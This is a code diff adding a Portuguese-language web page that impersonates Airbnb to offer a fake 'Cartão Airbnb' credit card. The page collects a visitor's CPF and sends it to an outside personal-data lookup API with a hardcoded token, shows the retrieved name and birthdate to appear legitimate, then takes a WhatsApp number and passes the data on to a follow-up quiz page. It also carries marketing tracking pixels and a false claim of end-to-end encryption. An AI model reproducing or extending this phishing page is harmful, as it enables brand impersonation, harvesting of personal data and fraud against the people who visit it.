@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificação de Identidade — Cartão Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--gray:#6A6A6A;--gray-light:#DDDDDD;--bg:#F7F7F7;--white:#FFFFFF;--green:#2E7D32;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--bg);color:var(--black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--white);display:flex;flex-direction:column}
+
+        /* NAV */
+        .nav{height:64px;border-bottom:1px solid var(--gray-light);background:rgba(255,255,255,.96);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;position:sticky;top:0;z-index:100}
+        .nav svg{height:26px;fill:var(--red)}
+
+        /* PROGRESS DOTS */
+        .prog{display:flex;align-items:center;justify-content:center;gap:6px;padding:20px 24px 0}
+        .dot{width:8px;height:8px;border-radius:50%;background:var(--gray-light);transition:.4s}
+        .dot.active{background:var(--red);width:24px;border-radius:4px}
+        .dot.done{background:#34C759}
+        .line{width:18px;height:2px;background:var(--gray-light);border-radius:1px;transition:.4s}
+        .line.done{background:#34C759}
+
+        /* CONTENT */
+        .content{flex:1;padding:32px 24px;display:flex;flex-direction:column;align-items:center}
+        .step-box{width:100%;text-align:center;animation:fadeUp .5s ease-out}
+        .step-box.hidden{display:none}
+        @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+
+        .step-icon{width:68px;height:68px;border-radius:20px;background:#FFF0F3;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:26px;color:var(--red)}
+        .step-icon.green-icon{background:#F0FAF2;color:#2E7D32}
+        .step-title{font-size:1.4rem;font-weight:800;letter-spacing:-.02em;margin-bottom:8px}
+        .step-sub{font-size:.875rem;color:var(--gray);margin-bottom:28px;line-height:1.6}
+
+        /* INPUT */
+        .input-wrap{width:100%;max-width:360px;margin:0 auto;text-align:left}
+        .inp-label{font-size:.8rem;font-weight:600;margin-bottom:7px;display:block;color:var(--black)}
+        .inp-box{position:relative;display:flex;align-items:center}
+        .inp-box i{position:absolute;left:16px;font-size:16px;color:var(--gray-light);pointer-events:none;transition:.2s}
+        .inp-field{width:100%;padding:15px 16px 15px 46px;border:1.5px solid var(--gray-light);border-radius:14px;font-size:1rem;font-family:var(--font);color:var(--black);background:var(--white);outline:none;transition:.2s}
+        .inp-field:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(255,56,92,.1)}
+        .inp-field:focus~i,.inp-box:focus-within i{color:var(--red)}
+        .inp-err{font-size:.73rem;color:#E00B41;margin-top:6px;display:none}
+        .inp-err.show{display:block}
+
+        /* BUTTON */
+        .btn-main{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;max-width:360px;padding:16px;background:linear-gradient(135deg,var(--red),var(--red-dark));color:#fff;border:none;border-radius:14px;font-size:.98rem;font-weight:700;font-family:var(--font);cursor:pointer;transition:.2s;margin-top:22px;position:relative;overflow:hidden}
+        .btn-main:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(255,56,92,.3)}
+        .btn-main:disabled{background:var(--gray-light);cursor:not-allowed;transform:none;box-shadow:none;color:var(--gray)}
+        .btn-main .spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+        .btn-main.loading .spinner{display:block}
+        .btn-main.loading .btn-label{display:none}
+        @keyframes spin{to{transform:rotate(360deg)}}
+
+        /* CONFIRM CARD */
+        .confirm-card{width:100%;max-width:360px;margin:0 auto;background:var(--bg);border:1px solid var(--gray-light);border-radius:16px;padding:20px;text-align:left}
+        .c-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--gray-light)}
+        .c-row:last-child{border-bottom:none}
+        .c-row .lbl{font-size:.8rem;color:var(--gray)}
+        .c-row .val{font-size:.9rem;font-weight:700;color:var(--black)}
+        .confirm-btns{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px;width:100%;max-width:360px}
+        .btn-sec{padding:14px;border:1.5px solid var(--gray-light);border-radius:12px;background:var(--white);font-size:.875rem;font-weight:700;font-family:var(--font);cursor:pointer;color:var(--gray);transition:.2s}
+        .btn-sec:hover{border-color:var(--black);color:var(--black)}
+        .btn-confirm{padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#34C759,#2DB84D);color:#fff;font-size:.875rem;font-weight:700;font-family:var(--font);cursor:pointer;transition:.2s}
+        .btn-confirm:hover{filter:brightness(1.05);transform:translateY(-1px)}
+
+        /* SUCCESS */
+        .success-icon{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#34C759,#2DB84D);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;animation:pop .5s cubic-bezier(.175,.885,.32,1.275)}
+        .success-icon i{font-size:28px;color:#fff}
+        @keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
+        .dots-loader{display:flex;justify-content:center;gap:6px;margin-top:14px}
+        .dots-loader .d{width:7px;height:7px;border-radius:50%;background:var(--red);animation:bounce 1.2s ease-in-out infinite}
+        .dots-loader .d:nth-child(2){animation-delay:.15s}
+        .dots-loader .d:nth-child(3){animation-delay:.3s}
+        @keyframes bounce{0%,80%,100%{transform:translateY(0)}40%{transform:translateY(-8px)}}
+
+        /* SECURITY NOTE */
+        .sec-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:auto;padding:20px 24px;font-size:.73rem;color:var(--gray)}
+        .sec-note i{font-size:12px;color:var(--gray)}
+    </style>
+</head>
+<body>
+<div class="page">
+
+    <nav class="nav">
+        <a href="index.html" aria-label="Airbnb">
+            <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195ZM770.655 998.902C688.609 998.902 618.24 941.522 555.918 872.587C620.182 792.437 691.088 679.004 691.088 577.819C691.088 458.428 598.258 389.892 503.109 389.892C407.96 389.892 315.13 458.428 315.13 577.819C315.13 679.004 385.536 792.437 450.3 872.587C387.978 941.522 317.609 998.902 235.564 998.902C146.633 998.902 81.0898 931.017 81.0898 846.845C81.0898 826.57 84.2273 807.856 91.2658 788.361C98.3043 770.426 120.925 720.52 130.285 701.025C203.607 541.17 282.448 380.534 364.35 220.679C379.17 191.047 404.131 141.921 422.858 119.307C443.148 94.3538 471.228 81.0975 503.109 81.0975C534.99 81.0975 563.07 94.3538 583.36 119.307C602.087 141.921 627.048 191.047 641.868 220.679C723.77 380.534 802.611 541.17 875.933 701.025C885.293 720.52 907.914 770.426 914.952 788.361C921.991 807.856 925.128 826.57 925.128 846.845C925.128 931.017 859.585 998.902 770.655 998.902Z"/></svg>
+        </a>
+    </nav>
+
+    <div class="prog">
+        <div class="dot active" id="dot1"></div>
+        <div class="line" id="line1"></div>
+        <div class="dot" id="dot2"></div>
+        <div class="line" id="line2"></div>
+        <div class="dot" id="dot3"></div>
+    </div>
+
+    <div class="content">
+
+        <!-- Step 1: CPF -->
+        <div class="step-box" id="step1">
+            <div class="step-icon"><i class="fas fa-user-shield"></i></div>
+            <h1 class="step-title">Verificar Identidade</h1>
+            <p class="step-sub">Informe seu CPF para iniciarmos a análise do seu Cartão Airbnb.</p>
+            <div class="input-wrap">
+                <label class="inp-label" for="cpfInput">CPF</label>
+                <div class="inp-box">
+                    <input type="text" id="cpfInput" class="inp-field" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" autocomplete="off">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <div class="inp-err" id="cpfError">CPF inválido. Verifique e tente novamente.</div>
+            </div>
+            <button class="btn-main" id="btnCpf" disabled>
+                <span class="btn-label"><i class="fas fa-arrow-right"></i> Continuar</span>
+                <div class="spinner"></div>
+            </button>
+        </div>
+
+        <!-- Step 2: Confirm -->
+        <div class="step-box hidden" id="step2">
+            <div class="step-icon"><i class="fas fa-check-double"></i></div>
+            <h1 class="step-title" id="greetTitle">Olá!</h1>
+            <p class="step-sub">Confirme que estes dados estão corretos para prosseguir.</p>
+            <div class="confirm-card">
+                <div class="c-row"><span class="lbl">Nome completo</span><span class="val" id="confNome">—</span></div>
+                <div class="c-row"><span class="lbl">Data de nascimento</span><span class="val" id="confNasc">—</span></div>
+                <div class="c-row"><span class="lbl">CPF</span><span class="val" id="confCpf">—</span></div>
+            </div>
+            <div class="confirm-btns">
+                <button class="btn-sec" id="btnNao">Não sou eu</button>
+                <button class="btn-confirm" id="btnSim"><i class="fas fa-check"></i> Sou eu, continuar</button>
+            </div>
+        </div>
+
+        <!-- Step 2.5: Phone -->
+        <div class="step-box hidden" id="stepPhone">
+            <div class="step-icon"><i class="fas fa-mobile-alt"></i></div>
+            <h1 class="step-title">Seu WhatsApp</h1>
+            <p class="step-sub">Informe seu número de telefone para receber atualizações do seu cartão.</p>
+            <div class="input-wrap">
+                <label class="inp-label" for="phoneInput">Telefone / WhatsApp</label>
+                <div class="inp-box">
+                    <input type="tel" id="phoneInput" class="inp-field" placeholder="(11) 99999-9999" maxlength="15" inputmode="numeric" autocomplete="tel">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <div class="inp-err" id="phoneError">Número inválido. Digite um celular com DDD.</div>
+            </div>
+            <button class="btn-main" id="btnPhone" disabled>
+                <span class="btn-label"><i class="fas fa-arrow-right"></i> Continuar</span>
+                <div class="spinner"></div>
+            </button>
+        </div>
+
+        <!-- Step 3: Success -->
+        <div class="step-box hidden" id="step3">
+            <div class="success-icon"><i class="fas fa-check"></i></div>
+            <h1 class="step-title">Identidade Verificada</h1>
+            <p class="step-sub">Seus dados foram confirmados. Preparando sua análise de crédito...</p>
+            <div class="dots-loader"><div class="d"></div><div class="d"></div><div class="d"></div></div>
+        </div>
+
+        <div class="sec-note"><i class="fas fa-shield-alt"></i> Dados protegidos com criptografia de ponta a ponta</div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+
+    const LeadData={_k:'airbnb_lead',save(d){localStorage.setItem(this._k,JSON.stringify(d))},load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};if(!u.lead_id)u.lead_id='AB'+Date.now().toString(36).toUpperCase()+Math.random().toString(36).substr(2,4).toUpperCase();this.save(u);return u}};
+
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    const cpfInput=document.getElementById('cpfInput');
+    const btnCpf=document.getElementById('btnCpf');
+    const cpfError=document.getElementById('cpfError');
+
+    cpfInput.addEventListener('input',function(){
+        let v=this.value.replace(/\D/g,'');
+        if(v.length>11)v=v.slice(0,11);
+        if(v.length>9)v=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
+        else if(v.length>6)v=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
+        else if(v.length>3)v=v.slice(0,3)+'.'+v.slice(3);
+        this.value=v;
+        cpfError.classList.remove('show');
+        btnCpf.disabled=v.replace(/\D/g,'').length!==11;
+    });
+
+    function validateCPF(cpf){
+        cpf=cpf.replace(/\D/g,'');
+        if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf))return false;
+        let s=0;for(let i=0;i<9;i++)s+=parseInt(cpf[i])*(10-i);
+        let d1=11-(s%11);if(d1>=10)d1=0;if(parseInt(cpf[9])!==d1)return false;
+        s=0;for(let i=0;i<10;i++)s+=parseInt(cpf[i])*(11-i);
+        let d2=11-(s%11);if(d2>=10)d2=0;return parseInt(cpf[10])===d2;
+    }
+    function maskCpf(cpf){const r=cpf.replace(/\D/g,'');return r.slice(0,3)+'.***.'+'***-'+r.slice(9);}
+    function formatDate(d){
+        if(!d) return '';
+        // Aceita formatos: DD/MM/AAAA, AAAA-MM-DD, ou DD-MM-AAAA
+        let str = d.toString().trim();
+        if(str.includes('/')) return str;
+        if(str.includes('-')) {
+            let parts = str.split('-');
+            if(parts[0].length === 4) return `${parts[2]}/${parts[1]}/${parts[0]}`;
+            if(parts[2].length === 4) return `${parts[0]}/${parts[1]}/${parts[2]}`;
+        }
+        return str;
+    }
+
+    // NOVA API AMNESIA
+    const API_TOKEN = "1d66db74-c807-45f8-8066-3d2b10e18188";
+    const API_URL = "https://api.amnesiatecnologia.rocks/";
+
+    btnCpf.addEventListener('click', async function(){
+        const raw = cpfInput.value.replace(/\D/g,'');
+        if(!validateCPF(raw)){
+            cpfError.classList.add('show');
+            cpfInput.focus();
+            return;
+        }
+        this.classList.add('loading');
+        this.disabled = true;
+        cpfError.classList.remove('show');
+
+        try {
+            const response = await fetch(`${API_URL}?token=${API_TOKEN}&cpf=${raw}`, {
+                method: 'GET',
+                headers: { 'Accept': 'application/json' }
+            });
+            const rawText = await response.text();
+            let data;
+            try { data = JSON.parse(rawText); }
+            catch(e) { throw new Error('Resposta inválida da API'); }
+
+            if(!response.ok){
+                throw new Error(data?.message || data?.error || `Erro ${response.status}: CPF não encontrado`);
+            }
+
+            // Extrair dados (estrutura pode ter DADOS ou direto)
+            const d = data.DADOS || data;
+            const nome = d.nome || d.NOME || null;
+            const nascimento = d.data_nascimento || d.NASC || d.nascimento || null;
+
+            if(!nome || !nascimento){
+                throw new Error('Dados incompletos para este CPF.');
+            }
+
+            // Salvar no LeadData
+            LeadData.update({
+                cpf: raw,
+                cpf_masked: maskCpf(raw),
+                nome: nome,
+                nascimento: nascimento,
+                page: 'confirm'
+            });
+
+            showStep2(nome, nascimento, raw);
+
+        } catch(err) {
+            cpfError.textContent = err.message || 'Erro ao consultar CPF. Tente novamente.';
+            cpfError.classList.add('show');
+            this.classList.remove('loading');
+            this.disabled = false;
+        }
+    });
+
+    cpfInput.addEventListener('keypress', e=>{if(e.key==='Enter' && !btnCpf.disabled) btnCpf.click();});
+
+    function showStep2(nome, nasc, cpf){
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('dot1').className = 'dot done';
+        document.getElementById('line1').className = 'line done';
+        document.getElementById('dot2').className = 'dot active';
+        const primeiroNome = nome.split(' ')[0];
+        document.getElementById('greetTitle').textContent = `Olá, ${primeiroNome}!`;
+        document.getElementById('confNome').textContent = nome;
+        document.getElementById('confNasc').textContent = formatDate(nasc);
+        document.getElementById('confCpf').textContent = maskCpf(cpf);
+    }
+
+    document.getElementById('btnSim').addEventListener('click', function(){
+        LeadData.update({ identity_confirmed: true });
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('stepPhone').classList.remove('hidden');
+    });
+
+    // Phone step
+    const phoneInput = document.getElementById('phoneInput');
+    const btnPhone = document.getElementById('btnPhone');
+    const phoneError = document.getElementById('phoneError');
+
+    function formatPhone(v){
+        v=v.replace(/\D/g,'');
+        if(v.length<=2) return v.length?'('+v:'';
+        if(v.length<=7) return '('+v.slice(0,2)+') '+v.slice(2);
+        if(v.length<=11) return '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
+        return '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7,11);
+    }
+    function isValidPhone(v){ return v.replace(/\D/g,'').length >= 10; }
+
+    phoneInput.addEventListener('input',function(){
+        this.value = formatPhone(this.value);
+        btnPhone.disabled = !isValidPhone(this.value);
+        phoneError.classList.remove('show');
+    });
+
+    btnPhone.addEventListener('click', function(){
+        const raw = phoneInput.value.replace(/\D/g,'');
+        if(!isValidPhone(phoneInput.value)){
+            phoneError.classList.add('show');
+            return;
+        }
+        const data = LeadData.load();
+        LeadData.update({ phone: raw, phone_formatted: phoneInput.value });
+
+        document.getElementById('stepPhone').classList.add('hidden');
+        document.getElementById('step3').classList.remove('hidden');
+        document.getElementById('dot2').className = 'dot done';
+        document.getElementById('line2').className = 'line done';
+        document.getElementById('dot3').className = 'dot active done';
+
+        setTimeout(()=>{
+            window.location.href = buildUrl('quiz.html', { nome: data.nome, cpf: data.cpf });
+        }, 2500);
+    });
+
+    document.getElementById('btnNao').addEventListener('click', function(){
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step1').classList.remove('hidden');
+        document.getElementById('dot2').className = 'dot';
+        document.getElementById('dot1').className = 'dot active';
+        document.getElementById('line1').className = 'line';
+        cpfInput.value = '';
+        btnCpf.disabled = true;
+        btnCpf.classList.remove('loading');
+        cpfInput.focus();
+        // Limpa dados salvos do CPF para não reutilizar
+        LeadData.update({ cpf: null, nome: null, nascimento: null });
+    });
+
+    setTimeout(()=>cpfInput.focus(), 300);
+</script>
+</body>
+</html>
+
